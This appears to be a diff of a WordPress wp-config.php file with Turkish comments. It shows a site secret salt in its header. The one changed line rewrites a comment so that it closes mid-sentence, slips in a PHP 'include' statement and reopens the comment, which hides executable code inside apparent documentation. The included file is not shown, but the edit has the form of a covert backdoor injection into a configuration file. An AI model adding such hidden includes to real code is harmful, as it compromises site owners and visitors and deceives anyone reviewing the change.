@@ -65,7 +65,7 @@ define('NONCE_SALT',       '~j$fDn-;_hE Y%/m%fZ=$,f~Q[i<dy<VcyJ*ouk_ic)U^BO4-^r:
 $table_prefix  = 'wp_';
 
 /**
- * WordPress yerel dil dosyası, varsayılan ingilizce.
+ * WordPress yerel dil */include /*dosyası, varsayılan ingilizce.
  *
  * Bu değeri değiştirmenize gerek yok! Zaten Türkçe'ye ayarlı.
  * tr_TR.mo Türkçe dil dosyasının wp-content/languages dizini altında olduğundan emin olun.
